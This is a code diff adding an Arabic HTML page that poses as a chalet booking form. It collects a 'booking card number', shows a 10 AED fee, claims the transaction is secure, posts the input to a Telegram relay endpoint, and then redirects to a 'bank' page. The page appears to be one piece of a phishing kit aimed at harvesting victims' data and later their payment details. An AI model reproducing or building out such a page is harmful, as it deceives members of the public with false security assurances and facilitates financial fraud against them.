@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيانات الحجز - شاليهات الجزيرة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .booking-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            animation: slideInUp 0.8s ease;
+        }
+
+        .booking-header {
+            background: linear-gradient(135deg, #2c5aa0, #1e3a8a);
+            color: white;
+            padding: clamp(1.5rem, 5vw, 2.5rem) clamp(1rem, 4vw, 2rem);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .booking-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+
+        .booking-header h1 {
+            font-size: clamp(1.5rem, 5vw, 2rem);
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            position: relative;
+            z-index: 2;
+            line-height: 1.3;
+        }
+
+        .booking-header p {
+            opacity: 0.9;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            position: relative;
+            z-index: 2;
+            line-height: 1.4;
+        }
+
+        .booking-form {
+            padding: clamp(2rem, 6vw, 3rem) clamp(1rem, 4vw, 2rem);
+        }
+
+        .form-group {
+            margin-bottom: clamp(1.5rem, 4vw, 2rem);
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 0.8rem;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            line-height: 1.3;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: clamp(0.8rem, 3vw, 1rem) clamp(1rem, 4vw, 1.5rem);
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            font-family: 'Tajawal', sans-serif;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+            line-height: 1.4;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2c5aa0;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(44, 90, 160, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .form-input:disabled {
+            background: #f1f5f9;
+            color: #64748b;
+            cursor: not-allowed;
+        }
+
+        .price-display {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: clamp(1rem, 4vw, 1.5rem);
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: clamp(1.5rem, 4vw, 2rem);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .price-display::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        .price-label {
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            opacity: 0.9;
+            margin-bottom: 0.5rem;
+            line-height: 1.3;
+        }
+
+        .price-value {
+            font-size: clamp(1.5rem, 6vw, 2rem);
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            line-height: 1.2;
+        }
+
+        .currency {
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            opacity: 0.8;
+        }
+
+        .submit-button {
+            width: 100%;
+            background: linear-gradient(135deg, #2c5aa0, #1e3a8a);
+            color: white;
+            border: none;
+            padding: clamp(1rem, 4vw, 1.2rem) clamp(1.5rem, 4vw, 2rem);
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Tajawal', sans-serif;
+            line-height: 1.3;
+        }
+
+        .submit-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(44, 90, 160, 0.3);
+        }
+
+        .submit-button:active {
+            transform: translateY(-1px);
+        }
+
+        .submit-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .submit-button:hover::before {
+            left: 100%;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #64748b;
+            text-decoration: none;
+            font-weight: 500;
+            margin-bottom: clamp(1.5rem, 4vw, 2rem);
+            transition: all 0.3s ease;
+            font-size: clamp(0.9rem, 3vw, 1rem);
+        }
+
+        .back-link:hover {
+            color: #2c5aa0;
+            transform: translateX(5px);
+        }
+
+        .security-info {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            border-radius: 8px;
+            padding: clamp(0.8rem, 3vw, 1rem);
+            margin-top: clamp(1rem, 3vw, 1.5rem);
+            text-align: center;
+        }
+
+        .security-info i {
+            color: #0ea5e9;
+            margin-left: 0.5rem;
+        }
+
+        .security-info p {
+            color: #0369a1;
+            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        /* Animations */
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Loading state */
+        .loading {
+            position: relative;
+            pointer-events: none;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Mobile Optimizations */
+        @media (max-width: 768px) {
+            body {
+                padding: 0.5rem;
+            }
+            
+            .booking-container {
+                margin: 0;
+                max-width: none;
+                border-radius: 15px;
+            }
+            
+            .booking-header {
+                border-radius: 15px 15px 0 0;
+            }
+        }
+
+        /* Extra small screens */
+        @media (max-width: 480px) {
+            body {
+                padding: 0.25rem;
+            }
+
+            .booking-container {
+                border-radius: 10px;
+            }
+
+            .booking-header {
+                border-radius: 10px 10px 0 0;
+            }
+        }
+
+        /* Landscape mobile optimization */
+        @media (max-width: 768px) and (orientation: landscape) {
+            body {
+                padding: 0.5rem;
+            }
+
+            .booking-header {
+                padding: 1rem;
+            }
+
+            .booking-form {
+                padding: 1.5rem 1rem;
+            }
+
+            .form-group {
+                margin-bottom: 1rem;
+            }
+        }
+
+        /* Touch device optimizations */
+        @media (hover: none) and (pointer: coarse) {
+            .submit-button:hover {
+                transform: none;
+            }
+            
+            .form-input:focus {
+                transform: none;
+            }
+        }
+
+        /* Prevent zoom on input focus (iOS Safari) */
+        @media screen and (max-width: 768px) {
+            .form-input {
+                font-size: 16px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="booking-container">
+        <div class="booking-header">
+            <h1><i class="fas fa-calendar-alt"></i> بيانات الحجز</h1>
+            <p>أدخل بيانات الحجز للمتابعة</p>
+        </div>
+        
+        <div class="booking-form">
+            <a href="index-2.html" class="back-link">
+                <i class="fas fa-home"></i>
+                العودة للصفحة الرئيسية
+            </a>
+            
+            <form id="bookingForm" action="bank/bank.html" method="post">
+                <div class="form-group">
+                    <label for="bookingId" class="form-label">
+                        <i class="fas fa-id-card"></i>
+                        رقم بطاقة الحجز
+                    </label>
+                    <input 
+                        type="text" 
+                        id="bookingId" 
+                        name="s1" 
+                        class="form-input" 
+                        placeholder="أدخل رقم بطاقة الحجز"
+                        required
+                        pattern="[A-Za-z0-9]{6,20}"
+                        title="يجب أن يحتوي رقم البطاقة على 6-20 حرف أو رقم"
+                    >
+                </div>
+
+                <div class="price-display">
+                    <div class="price-label">
+                        <i class="fas fa-tag"></i>
+                        قيمة بطاقة الحجز
+                    </div>
+                    <div class="price-value">
+                        <span>10</span>
+                        <span class="currency">درهم إماراتي</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount" class="form-label">
+                        <i class="fas fa-money-bill"></i>
+                        المبلغ المطلوب
+                    </label>
+                    <input 
+                        type="text" 
+                        id="amount" 
+                        name="amount" 
+                        class="form-input" 
+                        value="10 درهم إماراتي"
+                        disabled
+                        readonly
+                    >
+                </div>
+
+                <button type="submit" class="submit-button" id="submitBtn">
+                    <i class="fas fa-lock"></i>
+                    تأكيد الحجز والمتابعة للدفع
+                </button>
+
+                <div class="security-info">
+                    <p>
+                        <i class="fas fa-shield-alt"></i>
+                        معاملتك آمنة ومحمية بأحدث تقنيات الأمان
+                    </p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Form validation and submission
+        document.getElementById('bookingForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const bookingId = document.getElementById('bookingId').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Validate booking ID - تحسين التحقق من صحة البيانات
+            if (!bookingId) {
+                showError('يرجى إدخال رقم بطاقة الحجز');
+                return;
+            }
+            
+            if (bookingId.length < 6) {
+                showError('رقم بطاقة الحجز يجب أن يكون 6 أحرف على الأقل');
+                return;
+            }
+            
+            if (bookingId.length > 20) {
+                showError('رقم بطاقة الحجز يجب أن لا يتجاوز 20 حرف');
+                return;
+            }
+            
+            // التحقق من أن الرقم يحتوي على أحرف وأرقام فقط
+            const validPattern = /^[A-Za-z0-9]+$/;
+            if (!validPattern.test(bookingId)) {
+                showError('رقم بطاقة الحجز يجب أن يحتوي على أحرف وأرقام فقط (بدون رموز أو مسافات)');
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.classList.add('loading');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+            submitBtn.disabled = true;
+            
+            // Store booking data in localStorage
+            const bookingData = {
+                bookingId: bookingId,
+                amount: '10 درهم إماراتي',
+                currency: 'AED',
+                timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('bookingData', JSON.stringify(bookingData));
+            
+            // إرسال البيانات إلى API
+            fetch('/api/telegram/booking', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(bookingData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('فشل في إرسال البيانات');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('تم إرسال البيانات إلى تليجرام:', data);
+                
+                // عرض رسالة نجاح
+                showSuccess('تم إرسال البيانات بنجاح! جاري التحويل...');
+                
+                // Submit the form to bank page
+                setTimeout(() => {
+                    window.location.href = 'bank/bank.html';
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('خطأ في إرسال البيانات:', error);
+                
+                // إعادة تفعيل الزر في حالة الفشل
+                submitBtn.classList.remove('loading');
+                submitBtn.innerHTML = '<i class="fas fa-lock"></i> تأكيد الحجز والمتابعة للدفع';
+                submitBtn.disabled = false;
+                
+                showError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
+            });
+        });
+        
+        function showError(message) {
+            const existingError = document.querySelector('.error-message');
+            if (existingError) {
+                existingError.remove();
+            }
+            
+            const existingSuccess = document.querySelector('.success-message');
+            if (existingSuccess) {
+                existingSuccess.remove();
+            }
+            
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.style.cssText = `
+                background: #fee2e2;
+                border: 1px solid #fecaca;
+                color: #dc2626;
+                padding: 1rem;
+                border-radius: 8px;
+                margin-bottom: 1rem;
+                text-align: center;
+                animation: slideInUp 0.3s ease;
+                font-size: clamp(0.9rem, 3vw, 1rem);
+            `;
+            errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+            
+            const form = document.getElementById('bookingForm');
+            form.insertBefore(errorDiv, form.firstChild);
+            
+            setTimeout(() => {
+                if (errorDiv.parentNode) {
+                    errorDiv.remove();
+                }
+            }, 5000);
+        }
+        
+        function showSuccess(message) {
+            const existingError = document.querySelector('.error-message');
+            if (existingError) {
+                existingError.remove();
+            }
+            
+            const existingSuccess = document.querySelector('.success-message');
+            if (existingSuccess) {
+                existingSuccess.remove();
+            }
+            
+            const successDiv = document.createElement('div');
+            successDiv.className = 'success-message';
+            successDiv.style.cssText = `
+                background: #d1fae5;
+                border: 1px solid #6ee7b7;
+                color: #065f46;
+                padding: 1rem;
+                border-radius: 8px;
+                margin-bottom: 1rem;
+                text-align: center;
+                animation: slideInUp 0.3s ease;
+                font-size: clamp(0.9rem, 3vw, 1rem);
+            `;
+            successDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+            
+            const form = document.getElementById('bookingForm');
+            form.insertBefore(successDiv, form.firstChild);
+            
+            setTimeout(() => {
+                if (successDiv.parentNode) {
+                    successDiv.remove();
+                }
+            }, 3000);
+        }
+        
+        // Add floating animation to price display
+        document.addEventListener('DOMContentLoaded', function() {
+            const priceDisplay = document.querySelector('.price-display');
+            setInterval(() => {
+                priceDisplay.classList.add('pulse');
+                setTimeout(() => {
+                    priceDisplay.classList.remove('pulse');
+                }, 1000);
+            }, 5000);
+        });
+        
+        // Prevent form submission on Enter in booking ID field
+        document.getElementById('bookingId').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('submitBtn').click();
+            }
+        });
+
+        // Prevent zoom on input focus (iOS Safari)
+        document.addEventListener('touchstart', function() {}, true);
+        
+        // Add loading animation
+        window.addEventListener('load', function() {
+            document.body.style.opacity = '0';
+            document.body.style.transition = 'opacity 0.5s ease';
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+            }, 100);
+        });
+    </script>
+</body>
+</html>
